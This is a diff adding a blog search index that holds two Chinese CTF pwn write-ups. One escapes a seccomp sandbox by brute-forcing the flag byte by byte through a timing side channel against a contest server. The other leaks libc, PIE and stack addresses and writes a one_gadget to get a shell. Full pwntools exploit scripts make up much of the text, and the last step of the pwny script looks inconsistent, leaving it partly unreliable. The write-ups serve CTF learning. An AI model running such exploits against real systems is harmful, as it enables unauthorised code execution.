@@ -1,0 +1,95 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>蓝帽杯slient</title>
+    <url>/2021/04/29/2021%20%E8%93%9D%E5%B8%BD%E6%9D%AF%20pwn%20slient/</url>
+    <content><![CDATA[<blockquote>
+<p>这道题不是第一个上的pwn题，第一道太难了，第二个一出来就去看第二个题了= =</p>
+<p>一个沙箱绕过的题，以前没写过类似的，当场也没有写出来，于是复现一下。</p>
+</blockquote>
+<span id="more"></span>
+
+
+
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="seccomp概述"><a href="#seccomp概述" class="headerlink" title="seccomp概述"></a>seccomp概述</h3><ul>
+<li><p>restrict模式：SECCOMP_SET_MODE_STRICT</p>
+<ul>
+<li>白名单：read，write，_exit，sigreturn</li>
+<li>除了已经打开的文件描述符和允许的系统调用，如果发起其他系统调用，内核会使用SIGKILL或SIGSYS终止进程</li>
+</ul>
+</li>
+<li><p>filter模式：SECCOMP_SET_MODE_FILTER</p>
+<ul>
+<li>Seccomp-Berkley Packet Filter</li>
+<li>允许用户使用可配置的策略过滤系统调用</li>
+<li>使用BPF规则自定义测量</li>
+</ul>
+<blockquote>
+<p>BPF定义了一个伪机器，可以执行代码</p>
+</blockquote>
+<ul>
+<li>可对任意系统调用及其参数进行过滤</li>
+</ul>
+</li>
+<li><p>seccomp-bpf.h设置sandbox:使用该头文件，内置宏定义可直接设定白名单</p>
+</li>
+<li><p>prctl设置sandbox流程：</p>
+<p>定义filter数组 -&gt; 定义prog参数 -&gt;  prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog)</p>
+</li>
+<li><p>libseccomp设置sandbox</p>
+</li>
+</ul>
+<h2 id="常见绕过思路：orw"><a href="#常见绕过思路：orw" class="headerlink" title="常见绕过思路：orw"></a>常见绕过思路：orw</h2><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><blockquote>
+<p>  刚看这个题的时候，没觉得难，寒假写过一个类似的，就打算orw了，但是没想到write也被ban了TAT。后来看了学长的exp（嗯，我已经菜到面向exp打题了。。。），得知了一种通过cmp指令爆破flag的方法，此外这个题也没什么别的了，记录一下这个题的正确流程吧</p>
+</blockquote>
+<ul>
+<li>先例行检查，保护全开</li>
+<li>题目里一开始有mmap函数，同时加上随题有个.txt文件说了flag的位置，想到了orw</li>
+<li>检查一下seccomp规则，白名单只有read和open，（连openat，readv，writev这些都用不了。。）</li>
+<li>![](D:\software\daydreamer’s blog\source_posts\2021 蓝帽杯 pwn slient.assets\QQ截图20210429204319.png)</li>
+</ul>
+<p>所以只能按照上面说的思路写</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">EXCV = context.binary = <span class="string">&#x27;./chall&#x27;</span></span><br><span class="line">e = ELF(EXCV)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.I:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">p, index, ch</span>):</span></span><br><span class="line">    <span class="comment"># open</span></span><br><span class="line">    shellcode = <span class="string">&quot;push 0x10032aaa; pop rdi; shr edi, 12; xor esi, esi; push 2; pop rax; syscall;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># re open, rax =&gt; 4</span></span><br><span class="line">    shellcode += <span class="string">&quot;push 2; pop rax; syscall;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># read(rax, 0x10040, 0x50)</span></span><br><span class="line">    shellcode += <span class="string">&quot;mov rdi, rax; xor eax, eax; push 0x50; pop rdx; push 0x10040aaa; pop rsi; shr esi, 12; syscall;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># cmp and jz</span></span><br><span class="line">    <span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">        shellcode += <span class="string">&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret&quot;</span>.<span class="built_in">format</span>(index, ch)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        shellcode += <span class="string">&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret&quot;</span>.<span class="built_in">format</span>(index, ch)</span><br><span class="line"></span><br><span class="line">    shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">    p.sendafter(<span class="string">&quot;Welcome to silent execution-box.\n&quot;</span>, shellcode.ljust(<span class="number">0x40</span>-<span class="number">14</span>, <span class="string">b&#x27;a&#x27;</span>) + <span class="string">b&#x27;/home/pwn/flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">index = <span class="number">14</span></span><br><span class="line"></span><br><span class="line">ans = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">127</span>):</span><br><span class="line">        ch = <span class="built_in">chr</span>(ch)</span><br><span class="line">        ch =<span class="built_in">ord</span>(ch)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(ch))</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span>:</span><br><span class="line">            p = remote(<span class="string">&#x27;8.140.177.7&#x27;</span>,<span class="number">40334</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = process(EXCV)</span><br><span class="line">        pwn(p, index, ch)</span><br><span class="line">        start = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.recv(timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        end = time.time()</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> end-start &gt; <span class="number">1.5</span>:</span><br><span class="line">            ans.append(ch)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ans]))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ans]))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    index=index +<span class="number">1</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ans]))</span><br></pre></td></tr></table></figure>
+
+<p>唯一一点问题是一次只能爆破出来几位flag，运气不好的时候有可能1位都不行= =，就得多爆破几遍。</p>
+<p>汇编最好手写 ，，复现的时候用的python模块就失败了</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>2021 CISCN pwny复现</title>
+    <url>/2021/05/30/2021-CISCN-pwny%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>这个题保护全开了，先看一下各个函数吧</p>
+<p>write函数：</p>
+<p>整个write函数里面没有什么漏洞，就是一个可以往任意位置写入功能。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned __int64 write()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; // rbp</span><br><span class="line">  __int64 v2; // [rsp+0h] [rbp-28h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-20h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  __printf_chk(1LL, (__int64)&quot;Index: &quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%ld&quot;, &amp;v2);</span><br><span class="line">  v0 = v2;</span><br><span class="line">  v2 = 0LL;</span><br><span class="line">  read((unsigned __int8)fd, &amp;v2, 8uLL);</span><br><span class="line">  qword_202060[v0] = v2;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>read函数：</p>
+<p>read函数的里的文件描述符是从一个文件中随机读取的，因此这个需要一会先把文件描述符改为0才可以接收我们输入的东西。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned __int64 read_0()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; // rdx</span><br><span class="line">  __int64 v2; // [rsp+0h] [rbp-18h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  __printf_chk(1LL, (__int64)&quot;Index: &quot;);</span><br><span class="line">  v2 = 0LL;</span><br><span class="line">  read((unsigned __int8)fd, &amp;v2, 8uLL);</span><br><span class="line">  v0 = qword_202060[v2];</span><br><span class="line">  __printf_chk(1LL, (__int64)&quot;Result: %lx\n&quot;);</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><p>这个题由于scanf函数的特点，既可以看成一道栈的题，也可以看成一道堆题，这里先写出一种思路，后面再补看成堆的做法</p>
+<h3 id="修改文件描述符"><a href="#修改文件描述符" class="headerlink" title="修改文件描述符"></a>修改文件描述符</h3><p>可以试一下，如果我们一开始的时候没有调用write函数而是直接调用read函数，程序会直接结束进程。正是因为随机读取的文件描述符大概率不是0，1，2这三个。所以为了保证可以做到标准输入，我们要先把文件标识符改成0。</p>
+<p>我们调用write函数，然后把地址定到文件描述符的地址，这样就变成了把文件描述符变成一个随机数，这个随机数大概率上不是0,1,2,3。所以我们再次调用write函数，同样把地址定到文件描述符，此时文件描述符因为是一个随机数，就会出错找不到对应文件。</p>
+<p>而在read函数中把v2设置成了0，read又因为文件描述符找不到而读取失败，这样的话就把文件描述符处的数据写成了0，我们的第一步就完成了。到这里程序开始接收我们的输入。</p>
+<ul>
+<li>代码实现：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#change fd to 0</span></span><br><span class="line">sla(<span class="string">&quot;Your choice: &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="string">&#x27;256&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="string">&#x27;256&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h3><p>由于bss段上的stderr，stdin，stdout就在202060的上方不远处，我们可以通过程序的任意读来得到他们的位置，由于202060是八位一个下标，所以202020应该在202060[-4]的地方。注意，由于程序中这里用的是read函数，所以要把-4改成0xfffffffffffffffc。</p>
+<ul>
+<li>代码实现：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#leak libcbase</span></span><br><span class="line">sla(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Index: &#x27;</span>,p64(<span class="number">0xfffffffffffffffc</span>))</span><br><span class="line">ru(<span class="string">&#x27;Result: &#x27;</span>)</span><br><span class="line">stderr=<span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stderr------------&gt;&#x27;</span>,<span class="built_in">hex</span>(stderr))</span><br><span class="line">libcbase=stderr-libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>泄露pie的方法和上面类似，只不过数据在data段里</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#leak pie offset</span></span><br><span class="line">sla(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Index: &#x27;</span>,p64(<span class="number">0xfffffffffffffff5</span>))</span><br><span class="line">ru(<span class="string">&#x27;Result: &#x27;</span>)</span><br><span class="line">codebase=<span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)-<span class="number">0x202008</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;codebase--------------&gt;&#x27;</span>,<span class="built_in">hex</span>(codebase)</span><br></pre></td></tr></table></figure>
+
+<p>然后要找到栈上函数的返回地址，和偏移量（通过gdb实现）</p>
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y:io.sendlineafter(x, y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">rr = <span class="keyword">lambda</span> : io.recv(timeout=<span class="number">1</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> : io.recvline(keepends=<span class="literal">False</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : io.recvuntil(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#change fd to 0</span></span><br><span class="line">sla(<span class="string">&quot;Your choice: &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="string">&#x27;256&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="string">&#x27;256&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libcbase</span></span><br><span class="line">sla(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Index: &#x27;</span>,p64(<span class="number">0xfffffffffffffffc</span>))</span><br><span class="line">ru(<span class="string">&#x27;Result: &#x27;</span>)</span><br><span class="line">stderr=<span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stderr------------&gt;&#x27;</span>,<span class="built_in">hex</span>(stderr))</span><br><span class="line">libcbase=stderr-libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak pie offset</span></span><br><span class="line">sla(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Index: &#x27;</span>,p64(<span class="number">0xfffffffffffffff5</span>))</span><br><span class="line">ru(<span class="string">&#x27;Result: &#x27;</span>)</span><br><span class="line">codebase=<span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)-<span class="number">0x202008</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;codebase--------------&gt;&#x27;</span>,<span class="built_in">hex</span>(codebase))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak stack address</span></span><br><span class="line">offset=<span class="built_in">int</span>((libcbase+libc.sym[<span class="string">&#x27;environ&#x27;</span>]-codebase-<span class="number">0x202060</span>)/<span class="number">8</span>)</span><br><span class="line">sla(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Index: &#x27;</span>,p64(offset))</span><br><span class="line">ru(<span class="string">&#x27;Result: &#x27;</span>)</span><br><span class="line">stackaddress=<span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stackaddress-----------------&gt;&#x27;</span>,<span class="built_in">hex</span>(stackaddress))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">attack_address=stackaddress-<span class="number">0x120</span></span><br><span class="line">onegadget=<span class="number">0x10a41c</span></span><br><span class="line">offset=<span class="built_in">int</span>((-codebase-<span class="number">0x202060</span>)/<span class="number">8</span>)</span><br><span class="line">sla(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line">s(p64(onegadget+libcbase))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+</search>
